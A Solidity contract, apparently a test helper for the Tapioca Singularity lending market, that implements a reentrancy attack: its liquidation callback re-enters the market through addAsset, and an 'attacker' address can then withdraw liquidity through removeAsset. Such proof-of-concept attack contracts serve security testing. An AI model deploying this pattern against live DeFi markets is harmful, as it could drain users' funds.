// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

// External
import {IERC20} from "@boringcrypto/boring-solidity/contracts/interfaces/IERC20.sol";
import {BoringERC20} from "@boringcrypto/boring-solidity/contracts/libraries/BoringERC20.sol";
import {IMarketLiquidatorReceiver} from "tap-utils/interfaces/bar/IMarketLiquidatorReceiver.sol";
import {Singularity} from "tapioca-bar/markets/singularity/Singularity.sol";

/*

████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ 
╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗
   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║
   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║
   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
   
*/
contract MarketLiquidatorReceiverAddAssetReentrancy is IMarketLiquidatorReceiver {
    using BoringERC20 for IERC20;

    IERC20 public asset;
    address public attacker;

    constructor(IERC20 _token, address _attacker) {
        asset = _token;
        attacker = _attacker;
    }

    function onCollateralReceiver(
        address initiator,
        address tokenIn,
        address tokenOut,
        uint256 collateralAmount,
        bytes calldata data
    ) external returns (bool) {
        uint256 amountToReceive = abi.decode(data, (uint256));
        Singularity singularity = Singularity(payable(msg.sender));
        uint256 collateralBalance = IERC20(tokenIn).balanceOf(address(this));
        IERC20(singularity.borrowableToken()).approve(address(singularity), amountToReceive);
        singularity.addAsset(address(this), address(this), amountToReceive);
        return true;
    }

    function removeAsset(address market, uint256 amountToRemove)
        external
        returns (uint256 liquidityBalance, uint256 liquidityShares)
    {
        require(msg.sender == attacker, "Not authorized");
        Singularity singularity = Singularity(payable(market));
        liquidityBalance = singularity.liquidityBalance(address(this));
        if (liquidityBalance > 0) {
            liquidityShares = singularity.removeAsset(address(this), attacker, amountToRemove);
        }
    }
}
